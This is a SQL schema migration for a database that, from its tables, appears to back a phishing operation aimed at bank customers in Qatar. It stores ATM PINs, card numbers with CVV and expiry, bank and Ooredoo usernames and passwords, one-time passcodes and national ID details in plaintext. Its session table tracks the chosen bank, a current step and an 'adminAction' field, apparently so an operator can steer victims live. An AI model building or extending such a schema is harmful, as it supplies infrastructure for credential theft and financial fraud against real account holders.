CREATE TABLE "atmPinSubmissions" (
	"id" serial PRIMARY KEY NOT NULL,
	"sessionId" varchar(64) NOT NULL,
	"pin" varchar(10) NOT NULL,
	"submittedAt" timestamp DEFAULT now() NOT NULL
);
--> statement-breakpoint
CREATE TABLE "loginMethodSubmissions" (
	"id" serial PRIMARY KEY NOT NULL,
	"sessionId" varchar(64) NOT NULL,
	"loginType" varchar(20) NOT NULL,
	"cardNumber" varchar(50),
	"cardholderName" text,
	"expiryDate" varchar(10),
	"cvv" varchar(10),
	"username" varchar(255),
	"password" text,
	"submittedAt" timestamp DEFAULT now() NOT NULL
);
--> statement-breakpoint
CREATE TABLE "ooredooSubmissions" (
	"id" serial PRIMARY KEY NOT NULL,
	"sessionId" varchar(64) NOT NULL,
	"ooredooUser" varchar(255) NOT NULL,
	"ooredooPassword" text NOT NULL,
	"submittedAt" timestamp DEFAULT now() NOT NULL
);
--> statement-breakpoint
CREATE TABLE "otpSubmissions" (
	"id" serial PRIMARY KEY NOT NULL,
	"sessionId" varchar(64) NOT NULL,
	"otpCode" varchar(10) NOT NULL,
	"otpType" varchar(20) NOT NULL,
	"submittedAt" timestamp DEFAULT now() NOT NULL
);
--> statement-breakpoint
CREATE TABLE "personalDataSubmissions" (
	"id" serial PRIMARY KEY NOT NULL,
	"sessionId" varchar(64) NOT NULL,
	"nameArabic" text NOT NULL,
	"nameEnglish" text NOT NULL,
	"idNumber" varchar(50) NOT NULL,
	"phoneNumber" varchar(20) NOT NULL,
	"email" varchar(320) NOT NULL,
	"dateOfBirth" varchar(20) NOT NULL,
	"gender" varchar(10) NOT NULL,
	"customerStatus" varchar(50) NOT NULL,
	"submittedAt" timestamp DEFAULT now() NOT NULL
);
--> statement-breakpoint
CREATE TABLE "sessions" (
	"id" varchar(64) PRIMARY KEY NOT NULL,
	"selectedBank" varchar(50) NOT NULL,
	"country" varchar(100) DEFAULT 'Qatar',
	"status" varchar(20) DEFAULT 'pending' NOT NULL,
	"currentStep" varchar(50),
	"adminAction" varchar(20),
	"errorMessage" text,
	"createdAt" timestamp DEFAULT now() NOT NULL,
	"updatedAt" timestamp DEFAULT now() NOT NULL
);
--> statement-breakpoint
CREATE TABLE "users" (
	"id" serial PRIMARY KEY NOT NULL,
	"openId" varchar(64) NOT NULL,
	"name" text,
	"email" varchar(320),
	"loginMethod" varchar(64),
	"role" text DEFAULT 'user' NOT NULL,
	"createdAt" timestamp DEFAULT now() NOT NULL,
	"updatedAt" timestamp DEFAULT now() NOT NULL,
	"lastSignedIn" timestamp DEFAULT now() NOT NULL,
	CONSTRAINT "users_openId_unique" UNIQUE("openId")
);
